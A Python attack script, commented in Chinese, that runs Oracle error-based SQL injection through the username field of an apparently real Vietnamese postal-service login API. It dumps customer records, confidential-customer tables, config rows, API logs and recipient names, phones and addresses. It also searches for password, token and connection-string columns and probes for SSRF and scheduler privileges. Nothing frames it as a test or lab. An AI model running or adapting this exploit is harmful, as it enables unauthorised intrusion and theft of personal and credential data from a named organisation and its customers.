#!/usr/bin/env python3
"""
提取真正有价值的数据
"""

import requests
import json
import time

class ValueDataExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def extract_webhook_actual_data(self):
        """提取Webhook表实际数据"""
        print("=" * 80)
        print("🔗 提取PARTNER_MCS_WEBHOOK实际内容（95万条）")
        print("=" * 80)
        
        table = 'PARTNER_MCS_WEBHOOK'
        
        # 提取前100条完整数据
        print(f"\n提取前100条Webhook数据...")
        
        for i in range(1, 101):
            query = f"SELECT ID||'|'||TRACKING_CODE||'|'||ORDER_CODE||'|'||STATUS_CODE||'|'||STATUS_NAME||'|'||NOTE FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T ORDER BY AMND_DATE DESC) WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                if i <= 20:  # 只显示前20个
                    print(f"\n{i}. ID: {parts[0] if len(parts) > 0 else ''}")
                    print(f"   Tracking: {parts[1] if len(parts) > 1 else ''}")
                    print(f"   Order: {parts[2] if len(parts) > 2 else ''}")
                    print(f"   Status: {parts[3] if len(parts) > 3 else ''} - {parts[4] if len(parts) > 4 else ''}")
                    print(f"   Note: {parts[5] if len(parts) > 5 else ''}")
            
            if i % 20 == 0:
                print(f"\n已提取 {i}/100...")
            
            time.sleep(0.3)
    
    def extract_khach_hang_bao_mat_data(self):
        """提取客户保密表实际数据"""
        print("\n" + "=" * 80)
        print("🔒 提取KHACH_HANG_BAO_MAT实际内容（2,705条）")
        print("=" * 80)
        
        table = 'KHACH_HANG_BAO_MAT'
        
        # 提取所有数据
        print(f"\n提取前50条客户保密数据...")
        
        for i in range(1, 51):
            query = f"SELECT ID_THEM_MA_KH||'|'||MA_KH||'|'||STATUS||'|'||THOI_GIAN_THEM||'|'||THOI_GIAN_CAP_NHAT FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T) WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                print(f"\n{i}. ID: {parts[0] if len(parts) > 0 else ''}")
                print(f"   客户代码: {parts[1] if len(parts) > 1 else ''}")
                print(f"   状态: {parts[2] if len(parts) > 2 else ''}")
                print(f"   添加时间: {parts[3] if len(parts) > 3 else ''}")
                print(f"   更新时间: {parts[4] if len(parts) > 4 else ''}")
            
            time.sleep(0.3)
    
    def search_for_credentials_in_all_tables(self):
        """在所有表中搜索凭证相关字段"""
        print("\n" + "=" * 80)
        print("🔑 搜索所有表中的凭证/密码/Token字段")
        print("=" * 80)
        
        # 搜索包含敏感字段的表
        sensitive_columns = [
            'PASSWORD', 'PASS', 'PWD',
            'TOKEN', 'KEY', 'SECRET',
            'API_KEY', 'APIKEY',
            'USERNAME', 'USER', 'LOGIN',
            'CREDENTIAL', 'AUTH',
        ]
        
        for col in sensitive_columns:
            print(f"\n{'='*80}")
            print(f"搜索字段: {col}")
            print(f"{'='*80}")
            
            # 查找包含此字段的表
            query = f"SELECT DISTINCT TABLE_NAME FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND COLUMN_NAME LIKE '%{col}%' AND ROWNUM<=10"
            result = self.extract_via_error(query)
            
            if result and result != 'NULL':
                tables = result.split(',') if ',' in result else [result]
                
                for table in tables[:3]:  # 只检查前3个表
                    table = table.strip()
                    print(f"\n  表: {table}")
                    
                    time.sleep(0.5)
                    
                    # 查找此表中包含关键词的字段
                    query_cols = f"SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}' AND COLUMN_NAME LIKE '%{col}%'"
                    cols = self.extract_via_error(query_cols)
                    
                    if cols:
                        print(f"    字段: {cols}")
                        
                        time.sleep(0.5)
                        
                        # 提取数据样本
                        try:
                            query_data = f"SELECT {cols} FROM EMS.{table} WHERE {cols} IS NOT NULL AND ROWNUM<=3"
                            data = self.extract_via_error(query_data)
                            
                            if data:
                                print(f"    样本数据: {data}")
                        except:
                            pass
            
            time.sleep(1)
    
    def extract_config_actual_data(self):
        """提取CONFIG表实际配置"""
        print("\n" + "=" * 80)
        print("⚙️  提取CONFIG表实际配置")
        print("=" * 80)
        
        tables = ['CONFIG', 'CONFIG_LOAD', 'CONFIG_LOAD_BKU']
        
        for table in tables:
            print(f"\n{'='*80}")
            print(f"表: {table}")
            print(f"{'='*80}")
            
            # 获取所有字段
            query_cols = f"SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}' ORDER BY COLUMN_ID"
            cols = self.extract_via_error(query_cols)
            
            if cols:
                print(f"字段: {cols}")
            
            time.sleep(1)
            
            # 获取记录数
            query_count = f"SELECT COUNT(*) FROM EMS.{table}"
            count = self.extract_via_error(query_count)
            
            if count:
                print(f"记录数: {count}")
                
                # 提取所有数据
                try:
                    max_rows = min(int(count), 20)
                    
                    for i in range(1, max_rows + 1):
                        query = f"SELECT * FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T) WHERE RN={i}"
                        result = self.extract_via_error(query)
                        
                        if result:
                            print(f"\n{i}. {result}")
                        
                        time.sleep(0.5)
                except:
                    pass
            
            time.sleep(1)
    
    def extract_api_call_log_data(self):
        """提取API调用日志（可能包含敏感请求）"""
        print("\n" + "=" * 80)
        print("📝 提取API_CALL_LOG（115万条）")
        print("=" * 80)
        
        table = 'API_CALL_LOG'
        
        # 获取字段
        query_cols = f"SELECT COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND TABLE_NAME='{table}' ORDER BY COLUMN_ID"
        cols = self.extract_via_error(query_cols)
        
        if cols:
            print(f"字段: {cols}")
        
        time.sleep(1)
        
        # 提取最新50条
        print(f"\n提取最新50条API调用...")
        
        for i in range(1, 51):
            query = f"SELECT ITEMCODE||'|'||CALL_TIME||'|'||CREATED_AT FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T ORDER BY CREATED_AT DESC) WHERE RN={i}"
            result = self.extract_via_error(query)
            
            if result and i <= 20:
                parts = result.split('|')
                print(f"\n{i}. Item: {parts[0] if len(parts) > 0 else ''}")
                print(f"   Call Time: {parts[1] if len(parts) > 1 else ''}")
                print(f"   Created: {parts[2] if len(parts) > 2 else ''}")
            
            time.sleep(0.3)
    
    def try_utl_http_requests(self):
        """尝试UTL_HTTP发起外部请求"""
        print("\n" + "=" * 80)
        print("🌐 尝试UTL_HTTP外部请求（SSRF）")
        print("=" * 80)
        
        # 测试是否有UTL_HTTP权限
        test_url = "http://example.com"
        
        query = f"SELECT UTL_HTTP.REQUEST('{test_url}') FROM DUAL"
        result = self.extract_via_error(query)
        
        if result and 'ORA-' not in result:
            print(f"✅ UTL_HTTP可用！")
            print(f"响应: {result}")
        else:
            print(f"❌ UTL_HTTP不可用或无权限")
            if result:
                print(f"错误: {result}")
    
    def try_dbms_scheduler(self):
        """尝试创建定时任务"""
        print("\n" + "=" * 80)
        print("⏰ 尝试DBMS_SCHEDULER创建任务")
        print("=" * 80)
        
        # 测试是否有创建job的权限
        query = f"SELECT COUNT(*) FROM USER_SCHEDULER_JOBS"
        result = self.extract_via_error(query)
        
        if result:
            print(f"当前用户的定时任务数: {result}")
        else:
            print(f"无访问定时任务的权限")
    
    def extract_large_tables_samples(self):
        """提取超大表的样本数据"""
        print("\n" + "=" * 80)
        print("📊 提取超大表样本数据")
        print("=" * 80)
        
        large_tables = [
            ('E1E2_PH_TEMP_DATA2_LOG', 'MABC,NGUOINHAN,DIENTHOAINHAN,DIACHI'),
            ('ITEMSMS_V3', '*'),
            ('ITEMSMS_TCB', '*'),
        ]
        
        date = '20251010'
        
        for table, fields in large_tables:
            print(f"\n{'='*80}")
            print(f"表: {table}")
            print(f"{'='*80}")
            
            # 获取10月10日的样本
            for i in range(1, 11):
                query = f"SELECT {fields} FROM (SELECT T.*, ROWNUM AS RN FROM EMS.{table} T WHERE NGAY='{date}') WHERE RN={i}"
                result = self.extract_via_error(query)
                
                if result and i <= 5:
                    print(f"\n{i}. {result}")
                
                time.sleep(0.5)
    
    def search_for_connection_strings(self):
        """搜索数据库连接字符串"""
        print("\n" + "=" * 80)
        print("🔗 搜索数据库连接字符串")
        print("=" * 80)
        
        # 查询所有包含URL/HOST/SERVER的字段
        query = f"SELECT TABLE_NAME||'.'||COLUMN_NAME FROM ALL_TAB_COLUMNS WHERE OWNER='EMS' AND (COLUMN_NAME LIKE '%URL%' OR COLUMN_NAME LIKE '%HOST%' OR COLUMN_NAME LIKE '%SERVER%' OR COLUMN_NAME LIKE '%CONNECT%') AND ROWNUM<=20"
        result = self.extract_via_error(query)
        
        if result:
            print(f"包含连接信息的字段:")
            print(f"{result}")
            
            # 尝试提取数据
            fields = result.split(',') if ',' in result else [result]
            
            for field in fields[:10]:
                if '.' in field:
                    table, column = field.split('.')
                    
                    print(f"\n{'='*60}")
                    print(f"表.字段: {table}.{column}")
                    
                    time.sleep(0.5)
                    
                    query_data = f"SELECT {column} FROM EMS.{table} WHERE {column} IS NOT NULL AND ROWNUM<=5"
                    data = self.extract_via_error(query_data)
                    
                    if data:
                        print(f"数据: {data}")
                    
                    time.sleep(0.5)
    
    def run_extraction(self):
        """执行提取"""
        print("=" * 80)
        print("💎 提取真正有价值的数据")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        self.search_for_credentials_in_all_tables()
        self.extract_webhook_actual_data()
        self.extract_khach_hang_bao_mat_data()
        self.extract_config_actual_data()
        self.extract_api_call_log_data()
        self.search_for_connection_strings()
        self.extract_large_tables_samples()
        self.try_utl_http_requests()
        self.try_dbms_scheduler()
        
        print("\n" + "=" * 80)
        print("🎉 提取完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    extractor = ValueDataExtractor(target_url)
    extractor.run_extraction()
